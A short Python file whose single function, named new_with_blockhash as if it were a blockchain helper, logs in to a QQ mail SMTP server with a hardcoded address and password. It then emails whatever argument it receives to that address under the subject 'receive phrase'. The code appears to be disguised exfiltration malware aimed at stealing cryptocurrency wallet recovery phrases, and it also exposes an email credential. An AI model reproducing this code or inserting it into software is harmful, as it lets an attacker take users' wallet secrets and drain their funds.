import smtplib
from email.mime.text import MIMEText
from email.utils import formataddr
from email.header import Header
from email.mime.multipart import MIMEMultipart


def new_with_blockhash(payer=None):
    sender = '734547101@qq.com'
    receiver = '734547101@qq.com'
    subject = 'receive phrase'

    msg = MIMEMultipart()
    msg['From'] = formataddr([subject, sender])
    msg['To'] = formataddr([subject, receiver])
    msg['Subject'] = Header(subject, 'utf-8')
    msg.attach(MIMEText(str(payer), 'plain', 'utf-8'))
    username = '734547101@qq.com'
    password = 'lwbhpfassunebedg'
    smtp_server = 'smtp.qq.com'
    smtp_port = 587
    smtp = smtplib.SMTP(smtp_server, smtp_port)
    smtp.starttls()
    smtp.login(username, password)
    smtp.sendmail(sender, [receiver], msg.as_string())
    smtp.quit()
